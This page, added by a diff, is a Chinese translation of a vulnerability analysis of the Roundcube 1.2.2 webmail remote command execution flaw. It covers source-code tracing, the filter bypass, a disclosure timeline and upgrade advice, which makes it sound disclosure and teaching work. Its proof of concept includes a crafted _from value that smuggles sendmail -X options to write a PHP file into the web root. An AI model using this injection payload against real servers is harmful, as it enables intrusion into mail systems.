@@ -1,0 +1,132 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>【漏洞分析】流行开源电子邮件程序Roundcube v1.2.2命令执行漏洞分析</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>【漏洞分析】流行开源电子邮件程序Roundcube v1.2.2命令执行漏洞分析</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzAwODc2NjgwMg==&amp;mid=2649104945&amp;idx=2&amp;sn=4dfe50afec9b39238669654403c2aa48&amp;chksm=837b560cb40cdf1a1e1e923c8e685e784fae5f5c023a87b251963d5dc5fd4ece6d66f78a7618&amp;scene=126&amp;sessionid=1681324196#rd">http://mp.weixin.qq.com/s?__biz=MzAwODc2NjgwMg==&amp;mid=2649104945&amp;idx=2&amp;sn=4dfe50afec9b39238669654403c2aa48&amp;chksm=837b560cb40cdf1a1e1e923c8e685e784fae5f5c023a87b251963d5dc5fd4ece6d66f78a7618&amp;scene=126&amp;sessionid=1681324196#rd</a></blockquote><p style="margin-bottom: 15px; border: 0px;">都说漏洞分析，都从哪些地方开始分析？如何从漏洞分析中看出端倪并分析其他的漏洞呢？不妨看看这篇文章。</p><p style="margin-bottom: 15px; border: 0px;">悬镜小编亲历推荐。</p><p style="margin-bottom: 15px; border: 0px;"><strong>简介</strong></p><p style="margin-top: 15px; margin-bottom: 15px; border: 0px;">Roundcube是一款被广泛使用的开源的电子邮件程序，在全球范围内有很多组织和公司都在使用。</p><p style="margin-top: 15px; margin-bottom: 15px; border: 0px;">在过去的1年里，仅SourceForge上的镜像文件被下载次数就超过26万，这还仅仅是实际使用群体中的一小部分。</p><p style="margin-top: 15px; margin-bottom: 15px; border: 0px;">在服务器上成功安装Roundcube之后，它会提供给用户一个web接口，通过验证的用户就可以通过Web浏览器收发电子邮件。</p><p style="margin-top: 15px; margin-bottom: 15px; border: 0px;">在本文中，我们将看到攻击者是如何仅仅通过Roundcube1.2.2(&gt;=1.0)写封邮件，就能对底层操作系统实现任意命令执行。</p><p style="margin-top: 15px; margin-bottom: 15px; border: 0px;">这是个高危漏洞，由于使用默认安装方式的Roundcube都受影响，所以我们强烈建议使用Roundcube的管理员尽快更新到1.2.3版本。</p><p style="margin-top: 15px; margin-bottom: 15px; border: 0px;"><img data-s="300,640" data-type="png" data-src="http://mmbiz.qpic.cn/mmbiz_png/YPliaPic9m8ueibxJNK7CJPIJ2qMIyVRQZPFy6SfFCEj1hxZhbwdMurWMpLrsIiaDl1HBXgm1fuFpQRrDmpCEa7lDA/0?wx_fmt=png" data-ratio="0.48246844319775595" data-w="713" src="../Images/2ea61c22dc45230c663e6518e4b8386e.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/YPliaPic9m8ueibxJNK7CJPIJ2qMIyVRQZPFy6SfFCEj1hxZhbwdMurWMpLrsIiaDl1HBXgm1fuFpQRrDmpCEa7lDA/0?wx_fmt=png"/><br/></p><p style="margin-top: 15px; margin-bottom: 15px; border: 0px;">RIPS(一款自动化PHP代码静态分析工具)花了25秒的时间完整分析了整个应用程序，检测出了以上图表所展示的安全漏洞。</p><p style="margin-top: 15px; margin-bottom: 15px; border: 0px;">虽然图表中列举了很多问题，但是大部分都不太严重，因为它们属于安装模块的一部分或者是遗留代码。</p><p style="margin-top: 15px; margin-bottom: 15px; border: 0px;">不过，我们还是建议修补这些漏洞，以及将遗留代码删除，防止这些代码被不安全的使用或与其他安全漏洞形成组合漏洞。</p><p style="margin-top: 15px; margin-bottom: 15px; border: 0px;">以上分析结果可以在我们的RIPS demo中看到。注意，我们在分析结果中仅展示了本文所述漏洞</p><h3 style="margin-top: 20px; margin-bottom: 10px; border: 0px; font-weight: bold; -webkit-font-smoothing: antialiased; font-size: 18px;">漏洞利用条件</h3><p style="margin-top: 10px; margin-bottom: 15px; border: 0px;">Roundcube必须配置成使用PHP的mail()函数（如果没有指定SMTP，则是默认开启）</p><p style="margin-top: 15px; margin-bottom: 15px; border: 0px;">PHP的mail()函数配置使用sendmail（默认开启）</p><p style="margin-top: 15px; margin-bottom: 15px; border: 0px;">关闭PHP配置文件中的safe_mode（默认开启）</p><p style="margin-top: 15px; margin-bottom: 15px; border: 0px;">攻击者必须知道或者猜出网站根目录的绝对路径</p><p style="margin-top: 15px; margin-bottom: 15px; border: 0px;">以上条件都很容易达成，反过来说也就意味着网络中存在该漏洞的系统有很多。</p><h3 style="margin-top: 20px; margin-bottom: 10px; border: 0px; font-weight: bold; -webkit-font-smoothing: antialiased; font-size: 18px;">漏洞描述</h3><p style="margin-top: 10px; margin-bottom: 15px; border: 0px;">在Roundcube1.2.2或者更早的版本里，用户的输入未经过滤就被传到了PHP内建函数mail()的第五个参数，这已被证明是有很高安全风险的。</p><p style="margin-top: 15px; margin-bottom: 15px; border: 0px;">问题的根本在于mail()函数的调用会导致PHP调用sendmail程序。该参数允许被传入其他参数，以配置sendmail。</p><p style="margin-top: 15px; margin-bottom: 15px; border: 0px;">同时sendmail还提供了-X选项将邮件通信数据记录到一个文件，攻击者可以利用此选项在网站根目录下创建一个恶意PHP文件，以下代码可触发漏洞。</p><pre style="margin-top: 15px; margin-bottom: 15px; padding: 6px 10px; border: 1px solid rgb(204, 204, 204); font-size: 13px; font-family: Consolas, 'Liberation Mono', Courier, monospace; line-height: 19px; overflow: auto; border-radius: 3px;"><code style="font-size: 12px; font-family: Consolas, 'Liberation Mono', Courier, monospace; border: none; border-radius: 3px; background-image: initial; background-attachment: initial; background-color: transparent; background-origin: initial; background-clip: initial;">program/steps/mail/sendmail.inc
+
+$from = rcube_utils::get_input_value(’_from’, rcube_utils::INPUT_POST, true, $message_charset);
+
+⋮
+
+$sent = $RCMAIL-&gt;deliver_message($MAIL_MIME, $from, $mailto,$smtp_error, $mailbody_file, $smtp_opts);</code></pre><p style="margin-top: 15px; margin-bottom: 15px; border: 0px;">在以上代码中，获取到POST参数<em style="border: 0px;">from的值，然后传入到deliver</em>message()方法中作为第二个参数$from调用。</p><p style="margin-top: 15px; margin-bottom: 15px; border: 0px;">program/lib/Roundcube/rcube.php</p><pre style="margin-top: 15px; margin-bottom: 15px; padding: 6px 10px; border: 1px solid rgb(204, 204, 204); font-size: 13px; font-family: Consolas, 'Liberation Mono', Courier, monospace; line-height: 19px; overflow: auto; border-radius: 3px;"><code style="font-size: 12px; font-family: Consolas, 'Liberation Mono', Courier, monospace; border: none; border-radius: 3px; background-image: initial; background-attachment: initial; background-color: transparent; background-origin: initial; background-clip: initial;">public function deliver_message(&amp;$message, $from, $mailto, &amp;$error, &amp;$body_file = null, $options = null) {
+
+⋮
+
+if (filter_var(ini_get(‘safe_mode’), FILTER_VALIDATE_BOOLEAN))
+
+    $sent = mail($to, $subject, $msg_body, $header_str);
+
+else
+
+    $sent = mail($to, $subject, $msg_body, $header_str, “-f$from”);</code></pre><p style="margin-top: 15px; margin-bottom: 15px; border: 0px;">然后该方法将$from参数传递到mail()函数中。目的是将自定义的from头通过-f选项传递给sendmail程序。</p><h3 style="margin-top: 20px; margin-bottom: 10px; border: 0px; font-weight: bold; -webkit-font-smoothing: antialiased; font-size: 18px;">过滤不严</h3><p style="margin-top: 10px; margin-bottom: 15px; border: 0px;">有趣的事，似乎from参数已被正则表达式过滤。一般而言，$from参数中不能有空格，这也使得-f选项后面不能附加其他参数。</p><p style="margin-top: 15px; margin-bottom: 15px; border: 0px;">使用类似$IFS的空格常量或是注入新的shell命令`都不成功。然而，应用中存在一个会导致过滤失效逻辑缺陷。</p><pre style="margin-top: 15px; margin-bottom: 15px; padding: 6px 10px; border: 1px solid rgb(204, 204, 204); font-size: 13px; font-family: Consolas, 'Liberation Mono', Courier, monospace; line-height: 19px; overflow: auto; border-radius: 3px;"><code style="font-size: 12px; font-family: Consolas, 'Liberation Mono', Courier, monospace; border: none; border-radius: 3px; background-image: initial; background-attachment: initial; background-color: transparent; background-origin: initial; background-clip: initial;">program/steps/mail/sendmail.inc
+
+else if ($from_string = rcmail_email_input_format($from)) {
+
+if (preg_match(‘/(\S+@\S+)/‘, $from_string, $m))
+
+    $from = trim($m1, ‘&lt;&gt;‘);
+
+else
+
+    $from = null;
+
+}</code></pre><p style="margin-top: 15px; margin-bottom: 15px; border: 0px;">在105 行，从用户控制的$from变量（不包含空格）里提取出一封邮件。</p><p style="margin-top: 15px; margin-bottom: 15px; border: 0px;">不过只有当rcmail<em style="border: 0px;">email</em>input_format()返回TRUE时才能成功提取。接下来，我们就好好分析下这个函数。</p><pre style="margin-top: 15px; margin-bottom: 15px; padding: 6px 10px; border: 1px solid rgb(204, 204, 204); font-size: 13px; font-family: Consolas, 'Liberation Mono', Courier, monospace; line-height: 19px; overflow: auto; border-radius: 3px;"><code style="font-size: 12px; font-family: Consolas, 'Liberation Mono', Courier, monospace; border: none; border-radius: 3px; background-image: initial; background-attachment: initial; background-color: transparent; background-origin: initial; background-clip: initial;">program/steps/mail/sendmail.inc
+
+function rcmail_email_input_format($mailto, $count=false, $check=true)
+
+{
+
+global $RCMAIL, $EMAIL_FORMAT_ERROR, $RECIPIENT_COUNT;
+
+// simplified email regexp, supporting quoted local part
+
+$email_regexp = ‘(\S+|(”[^“]+”))@\S+‘;
+
+⋮
+
+// replace new lines and strip ending ‘, ‘, make address input more valid
+
+$mailto = trim(preg_replace($regexp, $replace, $mailto));
+
+$items  = rcube_utils::explode_quoted_string($delim, $mailto);
+
+$result = array();
+
+foreach ($items as $item) {
+
+    $item = trim($item);
+
+    // address in brackets without name (do nothing)
+
+    if (preg_match(‘/^&lt;‘.$email_regexp.‘&gt;$/’, $item)) {            $item     = rcube_utils::idn_to_ascii(trim($item, ‘&lt;&gt;‘));
+
+        $result[] = $item;
+
+    }
+
+    ⋮
+
+    else if (trim($item)) {
+
+        continue;
+
+    }
+
+    ⋮
+
+}
+
+if ($count) {
+
+    $RECIPIENT_COUNT += count($result);
+
+}
+
+return implode(‘, ‘, $result);
+
+}</code></pre><p style="margin-top: 15px; margin-bottom: 15px; border: 0px;">在863行</p><pre style="margin-top: 15px; margin-bottom: 15px; padding: 6px 10px; border: 1px solid rgb(204, 204, 204); font-size: 13px; font-family: Consolas, 'Liberation Mono', Courier, monospace; line-height: 19px; overflow: auto; border-radius: 3px;"><code style="font-size: 12px; font-family: Consolas, 'Liberation Mono', Courier, monospace; border: none; border-radius: 3px; background-image: initial; background-attachment: initial; background-color: transparent; background-origin: initial; background-clip: initial;"> if (preg_match(‘/^&lt;‘.$email_regexp.‘&gt;$/’, $item)) {
+ 该函数使用了另一个正则表达式，邮件匹配之后在行末使用$符。</code></pre><p style="margin-top: 15px; margin-bottom: 15px; border: 0px;">攻击者使用的payload只要不满足这个正则条件，在foreach循环后，$result数组会保持空值。</p><p style="margin-top: 15px; margin-bottom: 15px; border: 0px;">在这种情况下，876行的implode()函数返回一个空字符串(等价于FALSE)，然后$from的值就不会被过滤和改变了。</p><h3 style="margin-top: 20px; margin-bottom: 10px; border: 0px; font-weight: bold; -webkit-font-smoothing: antialiased; font-size: 18px;">概念验证</h3><p style="margin-top: 10px; margin-bottom: 15px; border: 0px;">当使用Roundcube发送邮件时，HTTP请求是可以被截断和篡改的。通过修改_from参数在文件系统上创建一个恶意文件。</p><pre style="margin-top: 15px; margin-bottom: 15px; padding: 6px 10px; border: 1px solid rgb(204, 204, 204); font-size: 13px; font-family: Consolas, 'Liberation Mono', Courier, monospace; line-height: 19px; overflow: auto; border-radius: 3px;"><code style="font-size: 12px; font-family: Consolas, 'Liberation Mono', Courier, monospace; border: none; border-radius: 3px; background-image: initial; background-attachment: initial; background-color: transparent; background-origin: initial; background-clip: initial;">example@example.com -OQueueDirectory=/tmp -X/var/www/html/rce.php</code></pre><p style="margin-top: 15px; margin-bottom: 15px; border: 0px;">这将允许攻击者在web根目录创建一个可执行文件rce.php，其内容就是_subject参数的值。</p><p style="margin-top: 15px; margin-bottom: 15px; border: 0px;">执行完请求之后，将会创建包含以下内容的文件。</p><pre style="margin-top: 15px; margin-bottom: 15px; padding: 6px 10px; border: 1px solid rgb(204, 204, 204); font-size: 13px; font-family: Consolas, 'Liberation Mono', Courier, monospace; line-height: 19px; overflow: auto; border-radius: 3px;"><code style="font-size: 12px; font-family: Consolas, 'Liberation Mono', Courier, monospace; border: none; border-radius: 3px; background-image: initial; background-attachment: initial; background-color: transparent; background-origin: initial; background-clip: initial;">04731 &gt;&gt;&gt; Recipient names must be specified
+
+04731 &lt;&lt;&lt; To: squinty@localhost
+
+04731 &lt;&lt;&lt; Subject: &lt;?php phpinfo(); ?&gt;
+
+04731 &lt;&lt;&lt; X-PHP-Originating-Script: 1000:rcube.php
+
+04731 &lt;&lt;&lt; MIME-Version: 1.0
+
+04731 &lt;&lt;&lt; Content-Type: text/plain; charset=US-ASCII;
+
+04731 &lt;&lt;&lt;  format=flowed
+
+04731 &lt;&lt;&lt; Content-Transfer-Encoding: 7bit
+
+04731 &lt;&lt;&lt; Date: So, 20 Nov 2016 04:02:52 +0100
+
+04731 &lt;&lt;&lt; From: example@example.com -OQueueDirectory=/tmp
+
+04731 &lt;&lt;&lt;  -X/var/www/html/rce.php
+
+04731 &lt;&lt;&lt; Message-ID: &lt;390a0c6379024872a7f0310cdea24900@localhost&gt;
+
+04731 &lt;&lt;&lt; X-Sender: example@example.com -OQueueDirectory=/tmp
+
+04731 &lt;&lt;&lt;  -X/var/www/html/rce.php
+
+04731 &lt;&lt;&lt; User-Agent: Roundcube Webmail/1.2.2
+
+04731 &lt;&lt;&lt;
+
+04731 &lt;&lt;&lt; Funny e-mail message
+
+04731 &lt;&lt;&lt; [EOF]</code></pre><p style="margin-top: 15px; margin-bottom: 15px; border: 0px;">因为邮件数据没有被编码，subject参数会以明文方式保存。这就允许将PHP标签写入到shell文件中。</p><h3 style="margin-top: 20px; margin-bottom: 10px; border: 0px; font-weight: bold; -webkit-font-smoothing: antialiased; font-size: 18px;">时间线</h3><blockquote style="margin-top: 15px; margin-bottom: 15px; padding-right: 15px; padding-left: 15px; border-width: 0px 0px 0px 4px; border-top-style: initial; border-right-style: initial; border-bottom-style: initial; border-top-color: initial; border-right-color: initial; border-bottom-color: initial; border-left-color: rgb(221, 221, 221); color: rgb(119, 119, 119);"><p style="margin-bottom: 15px; border: 0px;">2016/11/21 首次联系供应商</p><p style="margin-top: 15px; margin-bottom: 15px; border: 0px;">2016/11/22 供应商在Github上修复漏洞</p><p style="margin-top: 15px; margin-bottom: 15px; border: 0px;">2016/11/28 供应商同意协调披露</p><p style="margin-top: 15px; border: 0px;">2016/11/28 供应商发布Roundcube1.2.3</p></blockquote><h3 style="margin-top: 20px; margin-bottom: 10px; border: 0px; font-weight: bold; -webkit-font-smoothing: antialiased; font-size: 18px;">总结</h3><p style="margin-top: 10px; margin-bottom: 15px; border: 0px;">Roundcube已经可以抵御来自网络中的很多攻击向量，且有一个庞大的社区进行维护，本文中所描述的漏洞实属少见。</p><p style="margin-top: 15px; margin-bottom: 15px; border: 0px;">在自动化检测工具的帮助下，我们不仅可以检测到这种少见的漏洞，还节省了大量人力，将更多的精力放在其他方向。</p><p style="margin-top: 15px; margin-bottom: 15px; border: 0px;">参考资料</p><blockquote style="margin-top: 15px; margin-bottom: 15px; padding-right: 15px; padding-left: 15px; border-width: 0px 0px 0px 4px; border-top-style: initial; border-right-style: initial; border-bottom-style: initial; border-top-color: initial; border-right-color: initial; border-bottom-color: initial; border-left-color: rgb(221, 221, 221); color: rgb(119, 119, 119);"><p style="margin-bottom: 15px; border: 0px;">https://sourceforge.net/projects/roundcubemail/files/stats/timeline?dates=2015-12-01+to+2016-12-01 [return]</p><p style="margin-top: 15px; margin-bottom: 15px; border: 0px;">https://github.com/roundcube/roundcubemail/wiki/Configuration#sending-messages-via-smtp [return]</p><p style="margin-top: 15px; margin-bottom: 15px; border: 0px;">http://php.net/manual/en/mail.configuration.php [return]</p><p style="margin-top: 15px; border: 0px;">http://php.net/manual/en/ini.sect.safe-mode.php [return]</p></blockquote><h6 style="margin-top: 20px; border: 0px; font-weight: bold; -webkit-font-smoothing: antialiased; color: rgb(119, 119, 119); font-size: 14px;">*参考来源：Ripstech，FB小编鸢尾编译，转载请注明来自FreeBuf（FreeBuf.COM）</h6><hr/><p style="margin-top: 15px; margin-bottom: 15px; line-height: 25.6px; white-space: normal; border: 0px;"><strong style="line-height: 25.6px; color: rgb(255, 41, 65);"><span style="font-size: 14px;">置顶悬镜安全实验室公众号，给你最新，最有料的资讯，安全技术干货。</span></strong><br/><span style="line-height: 1.6;"/></p><p style="margin-top: 15px; line-height: 25.6px; white-space: normal; border: 0px; text-align: center;"><img data-type="gif" data-src="http://mmbiz.qpic.cn/mmbiz_gif/YPliaPic9m8ueZUNpcxU464y7AeENFdemCyia66ufeNkWCdpG65jrTL0FSQMLUI1XWt8ltlerwWyeGibHPCkzAg4Mg/0?wx_fmt=gif" data-ratio="0.8" data-w="600" src="../Images/5fdc1d147b9a03c6af0bb46fd6ac5ce7.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_gif/YPliaPic9m8ueZUNpcxU464y7AeENFdemCyia66ufeNkWCdpG65jrTL0FSQMLUI1XWt8ltlerwWyeGibHPCkzAg4Mg/0?wx_fmt=gif"/><br/><strong><span style="font-size: 14px;">有料丨有趣丨行业丨观点丨</span></strong></p><p style="line-height: 25.6px; white-space: normal; text-align: center;"><img data-s="300,640" data-type="jpeg" data-src="http://mmbiz.qpic.cn/mmbiz_jpg/YPliaPic9m8uf7DAviaB37dVK60DicgkMN3ZP2eeFDibseScfDNAfEvLSrwic5LYs6PxOaF4qNHhlnv2qAdE7ZZ4c4EQ/0?wx_fmt=jpeg" data-ratio="1" data-w="258" src="../Images/2be399883ca5352b2cf877427eb05721.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_jpg/YPliaPic9m8uf7DAviaB37dVK60DicgkMN3ZP2eeFDibseScfDNAfEvLSrwic5LYs6PxOaF4qNHhlnv2qAdE7ZZ4c4EQ/0?wx_fmt=jpeg"/><br/><span style="color: rgb(136, 136, 136);"><strong><span style="font-size: 14px;">关注悬镜安全实验室</span></strong></span></p><p style="line-height: 25.6px; white-space: normal; text-align: center;"><span style="color: rgb(136, 136, 136);"><strong><span style="font-size: 14px;">了解最新产品动态</span></strong></span></p>
+        
+</body>
+</html>
